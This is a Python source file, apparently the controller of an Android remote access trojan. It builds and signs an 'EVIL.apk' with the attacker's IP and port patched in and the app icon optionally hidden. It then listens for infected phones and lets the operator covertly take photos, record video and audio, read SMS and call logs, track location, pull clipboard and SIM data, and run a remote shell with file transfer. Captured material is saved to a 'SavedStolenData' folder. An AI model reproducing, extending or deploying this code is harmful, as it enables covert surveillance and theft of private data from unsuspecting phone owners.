#!/usr/bin/python
# -*- coding: utf-8 -*-

import sys
import os
import base64
import time
import binascii
import select
import pathlib
import platform
import re
from subprocess import PIPE, run
import socket
import threading
import itertools
import queue

sys.stdout.reconfigure(encoding='utf-8')

banner = """
 #######                                                                
    #    # #    # ######    #####  ####     #    #   ##    ####  #    # 
    #    # ##  ## #           #   #    #    #    #  #  #  #    # #   #  
    #    # # ## # #####       #   #    #    ###### #    # #      ####   
    #    # #    # #           #   #    #    #    # ###### #      #  #   
    #    # #    # #           #   #    #    #    # #    # #    # #   #  
    #    # #    # ######      #    ####     #    # #    #  ####  #    # 
                                                                        
                                                                        
 ##### #    # ###### # #####     #####  #    #  ####  #    # ######     
   #   #    # #      # #    #    #    # #    # #    # ##   # #          
   #   ###### #####  # #    #    #    # ###### #    # # #  # #####      
   #   #    # #      # #####     #####  #    # #    # #  # # #          
   #   #    # #      # #   #     #      #    # #    # #   ## #          
   #   #    # ###### # #    #    #      #    #  ####  #    # ######     
                                                    
                                        By Mobile Security Team 15
"""

pattern = '\"(\\d+\\.\\d+).*\"'

# Improved stdOutput function using dictionary mapping
def stdOutput(type_=None):
    messages = {
        "error": "ERROR: ",
        "warning": "WARNING: ",
        "success": "SUCCESS: ",
        "info": "Status: "
    }
    return messages.get(type_, "")

# Simplified animate function
def animate(message):
    chars = "/—\\|"
    for char in chars:
        sys.stdout.write(f"\r{stdOutput('info')}{message}{char}")
        time.sleep(0.1)
        sys.stdout.flush()


# Function to determine and return the appropriate clear screen command and directory separator
def clearDirec():
    if platform.system() == 'Windows':
        # Returns the clear screen command for Windows and the directory separator
        return lambda: os.system('cls'), "\\"
    else:
        # Returns the clear screen command for Unix/Linux and the directory separator
        return lambda: os.system('clear'), "/"
    

clear, direc = clearDirec()

# Ensure Dumps directory exists
os.makedirs(os.path.join(os.getcwd(), "SavedStolenData"), exist_ok=True)

def is_valid_ip(ip):
    m = re.match(r"^(\d{1,3})\.(\d{1,3})\.(\d{1,3})\.(\d{1,3})$", ip)
    return bool(m) and all(0 <= int(n) <= 255 for n in m.groups())

def is_valid_port(port):
    return port.isdigit() and len(port) > 1

def execute(command):
    return run(command, stdout=PIPE, stderr=PIPE, universal_newlines=True, shell=True)

def executeCMD(command, q):
    result = run(command, stdout=PIPE, stderr=PIPE, universal_newlines=True, shell=True)
    q.put(result)
    return result

def getpwd(name):
    return os.path.join(os.getcwd(), name)


def help():
    helper = """
Usage and Descriptions:

General Commands:
- deviceInfo: Returns device info (model, OS, etc.).
- clear: Clears the command line screen.

Camera & Recording:
- camList: Lists all camera IDs (e.g., '0' for back).
- takepic [cameraID]: Captures a picture (e.g., 'takepic 0').

- startVideo [cameraID]: Starts video recording (e.g., 'startVideo 0' --> use back camera to record video).
- stopVideo: Stops video recording.

- startAudio: Starts audio recording.
- stopAudio: Stops audio recording.

SMS & Call Logs:
- getSMS inbox/sent: Retrieves SMS messages from inbox/sent.
- getCallLogs: Fetches and saves call logs.

Device Info & Location:
- getLocation: Returns device's current location.
- getIP: Fetches device's current IP address.
- getSimDetails: Provides SIM card details.
- getClipData: Retrieves text from clipboard.
- getMACAddress: Returns the device's MAC address.

Miscellaneous:
- vibrate [number_of_times]: Vibrates the device (e.g., 'vibrate 3').
- shell: Starts an interactive shell on the device.
- exit: Exits the interpreter.

Commands allow for monitoring and control over the device with simple instructions.
    """
    print(helper)


def print_message(message_type, message):
    print(stdOutput(message_type) + message)

def safe_remove(file_path):
    try:
        os.remove(file_path)
    except OSError:
        pass

def getImage(client):
    print_message("info", "Taking Image")
    timestr = time.strftime("%Y%m%d-%H%M%S")
    filename = "SavedStolenData" + direc + "Image_" + timestr + '.jpg'
    imageBuffer = recvall(client).strip().replace("END123", "").strip()
    
    if not imageBuffer:
        print_message("error", "Unable to connect to the Camera\n")
        return
    
    try:
        with open(filename, 'wb') as img:
            img.write(base64.b64decode(imageBuffer))
        print_message("success", "Successfully Saved in " + getpwd(filename) + "\n")
    except binascii.Error:
        print_message("error", "Not able to decode the Image\n")
        safe_remove(filename)

def readSMS(client, data):
    print_message("info", "Getting " + data + " SMS")
    timestr = time.strftime("%Y%m%d-%H%M%S")
    filename = "SavedStolenData" + direc + data + "_" + timestr + '.txt'
    
    try:
        with open(filename, 'w', errors="ignore", encoding="utf-8") as txt:
            msg = recvall(client)
            txt.write(msg)
        print_message("success", "Successfully Saved in " + getpwd(filename) + "\n")
    except UnicodeDecodeError:
        print_message("error", "Unable to decode the SMS\n")
        safe_remove(filename)

def getFile(filename, ext, data):
    fileData = "SavedStolenData" + direc + filename + "." + ext
    
    try:
        with open(fileData, 'wb') as file:
            file.write(base64.b64decode(data))
        print_message("success", "Successfully Downloaded in " + getpwd(fileData) + "\n")
    except binascii.Error:
        print_message("error", "Not able to decode the Audio File")
        safe_remove(fileData)

def putFile(filename):
    with open(filename, "rb") as file:
        data = file.read()
    return base64.b64encode(data)


def shell(client):
    
    # Display a welcome message with guidance
    print_welcome_message()
    
    while True:
        # Receive the command output or file operation signal
        msg = recvallShell(client)

        # Handle file retrieval from the target
        if "getFile" in msg:
            file_metadata = recvall(client).replace("\nEND123\n", "").split("|_|")
            if len(file_metadata) == 3:
                getFile(*file_metadata)

        # Handle file sending to the target
        elif "putFile" in msg:
            filename = command.split(" ")[1].strip()
            filepath = pathlib.Path(filename)
            if filepath.exists():
                encoded_data = putFile(filename).decode("UTF-8")
                filedata = filename.split(".")
                sendingData = f"putFile<{filedata[0]}<{filedata[1]}<{encoded_data}END123\n"
                client.send(sendingData.encode("UTF-8"))
                print(stdOutput("success") + f"Succesfully Uploaded the file {filepath} in /sdcard/temp/")
            else:
                print(stdOutput("error") + "File not exist")

        # Exit the shell
        elif "Exiting" in msg:
            print("\n----------Exiting Shell----------\n")
            break

        # Print command output
        else:
            print("\n".join(msg.split("\n")[:-2]))
        
        # Capture and send new command
        command = input("admin@shell:~$").strip()
        
        if command == "help":
            print_shell_commands_help()
        elif command == "clear":
            clear()
            client.send("clear\n".encode("UTF-8"))
        else:
            client.send(f"{command}\n".encode("UTF-8"))
    

def print_welcome_message():
    print("""Welcome to the remote shell. Type 'help' for a list of useful commands you can try.""")

def print_shell_commands_help():
    print("""
Some useful shell commands to try:
- ls: List directory contents.
- pwd: Print the name of the current working directory.
- whoami: Display the current user.
- ifconfig: Display network configuration.
- ps: Report a snapshot of the current processes.
- netstat: Show network status.
- cat [file]: Display the content of a file.
- mkdir [directory]: Create a new directory.
- rm [file]: Remove a file. Use carefully.
- exit: Exit the shell session.

Remember, these commands depend on the target device's environment and permissions.

Please wait for 10 seconds before next command.
""")
    
def getLocation(sock):
    while True:
        msg = recvall(sock).split("\n")
        if "END123" in msg:
            break
        for line in msg[:-2]:
            print(line)
        print(" ")


def recvall(sock):
    buff = ""
    try:
        while True:
            data = sock.recv(4096).decode("UTF-8", "ignore")
            if not data:
                print("No data received. Connection may be closed.")
                break
            buff += data
            if "END123" in buff:
                break
    except Exception as e:
        print(f"An error occurred: {e}")
    return buff


def recvallShell(sock):
    buff = ""
    while True:
        ready = select.select([sock], [], [], 3)
        if ready[0]:
            data = sock.recv(4096).decode("UTF-8", "ignore")
            if "END123" in data:
                return buff + data
            buff += data
        else:
            return "bogus"


def stopAudio(client):
    print(stdOutput("info")+"Downloading Audio")
    timestr = time.strftime("%d%m%Y-%H%M%S")
    data= ""
    flag =0
    data=recvall(client) 
    data = data.strip().replace("END123","").strip()
    filename = "SavedStolenData"+direc+"Audio_"+timestr+".mp3"
    with open(filename, 'wb') as audio:
        try:
            audioData = base64.b64decode(data)
            audio.write(audioData)
            print(stdOutput("success")+"Succesfully Saved in "+getpwd(filename))
        except binascii.Error:
            flag=1
            print(stdOutput("error")+"Not able to decode the Audio File")
    print(" ")
    if flag == 1:
        os.remove(filename)


def stopVideo(client):
    print(stdOutput("info")+"Downloading Video")
    timestr = time.strftime("%d%m%Y-%H%M%S")
    data= ""
    flag=0
    data=recvall(client) 
    data = data.strip().replace("END123","").strip()
    filename = "SavedStolenData"+direc+"Video_"+timestr+'.mp4' 
    
    with open(filename, 'wb') as video:
        try:
            videoData = base64.b64decode(data)
            video.write(videoData)
            print(stdOutput("success")+"Succesfully Saved in "+getpwd(filename))
        except binascii.Error:
            flag = 1
            print(stdOutput("error")+"Not able to decode the Video File\n")
    if flag == 1:
        os.remove("Video_"+timestr+'.mp4')


def callLogs(client):
    print(stdOutput("info") + "Getting Call Logs")
    msg = "start"
    timestr = time.strftime("%Y%m%d-%H%M%S")
    msg = recvall(client)
    filename = "SavedStolenData" + direc + "Call_Logs_" + timestr + '.txt'
    
    if "No call logs" in msg:
        msg = msg.split("\n")
        print(msg.replace("END123", "").strip())
        print(" ")
    else:
        with open(filename, 'w', errors="ignore", encoding="utf-8") as txt:
            txt.write(msg)
            txt.close()
        print(stdOutput("success") + "Succesfully Saved in " + getpwd(filename))
        if not os.path.getsize(filename):
            os.remove(filename)


def connection_checker(socket, queue):
    conn, addr = socket.accept()
    queue.put((conn, addr))


# Function to initiate the server socket and wait for incoming connections
def get_shell(ip, port):
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as soc:
        try:
            soc.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            soc.bind((ip, int(port)))
            soc.listen(2)
            print(banner)
        except Exception as e:
            print(stdOutput("error") + " %s" % e)
            sys.exit()

        while True:
            que = queue.Queue()
            t = threading.Thread(target=connection_checker, args=(soc, que), daemon=True)
            t.start()
            print(stdOutput("info") + "Waiting for Connections...")
            conn, addr = que.get()
            clear()
            print(f"Got connection from {addr}\n")

            while True:
                msg = conn.recv(4024).decode("UTF-8").strip()
                if msg == "IMAGE":
                    getImage(conn)
                elif msg.startswith("readSMS"):
                    data = msg.split(" ")[1]
                    readSMS(conn, data)
                elif msg == "SHELL":
                    shell(conn)
                elif msg == "getLocation":
                    getLocation(conn)
                elif msg == "stopVideo123":
                    stopVideo(conn)
                elif msg == "stopAudio":
                    stopAudio(conn)
                elif msg == "callLogs":
                    callLogs(conn)
                elif msg == "help":
                    help()
                else:
                    print(stdOutput("error") + msg if "Unknown Command" in msg else msg)

                message_to_send = input("What do you want to do? type 'help' for commands :/> ") + "\n"
                conn.send(message_to_send.encode("UTF-8"))
                if message_to_send.strip() == "exit":
                    print("\n\tOkay dokie, bye.")
                    sys.exit()
                if message_to_send.strip() == "clear":
                    clear()



def build(ip, port, output, ngrok=False, ng=None, icon=None):
    editor_path = os.path.join("app-debug", "smali_classes7", "com", "teamxdevelopers", "SuperChat", "malware", "JavaPayload", "Config", "config.smali")
    
    try:
        with open(editor_path, "r") as file:
            lines = file.readlines()
        
        lines[18] = lines[18][:21] + f'"{ip}"\n'
        lines[23] = lines[23][:21] + f'"{port}"\n'
        lines[28] = lines[28][:15] + (" 0x0\n" if icon else " 0x1\n")
        
        with open(editor_path, "w") as file:
            file.writelines(lines)
    except Exception as e:
        print(stdOutput("error") + str(e))
        sys.exit()
        
    java_version = execute("java -version")
    if java_version.returncode:
        print(stdOutput("error") + "Java not installed or found")
        exit()
        
    print(stdOutput("info") + "Generating APK")
    outFileName = output if output else "EVIL.apk"
    que = queue.Queue()
    thread = threading.Thread(target=executeCMD, args=(f"java -jar Jar_tools/apktool.jar b app-debug -o {outFileName}", que))
    thread.start()
    
    while thread.is_alive():
        animate("Building APK")
    thread.join()
    resOut = que.get()
    
    if not resOut.returncode:
        print(stdOutput("success") + f"Successfully apk built in {getpwd(outFileName)}")
        print(stdOutput("info") + "Signing the apk")
        sign_apk(outFileName, que, ngrok, ng)  # another function that handles the APK signing.
    else:
        print(stdOutput("error") + "Building Failed")
        print(resOut.stderr)

def sign_apk(outFileName, que, ngrok=False, ng=None):
    thread = threading.Thread(target=executeCMD, args=(f"java -jar Jar_tools/sign.jar -a {outFileName} --overwrite", que))
    thread.start()
    while thread.is_alive():
        animate("Signing Apk")
    thread.join()
    
    resOut = que.get()
    if not resOut.returncode:
        print(stdOutput("success") + f"Successfully signed the apk {outFileName}")
        if ngrok:
            clear()
            get_shell("0.0.0.0", 8000 if not ng else ng)
    else:
        print(stdOutput("error") + "Signing Failed")
        print(resOut.stderr)


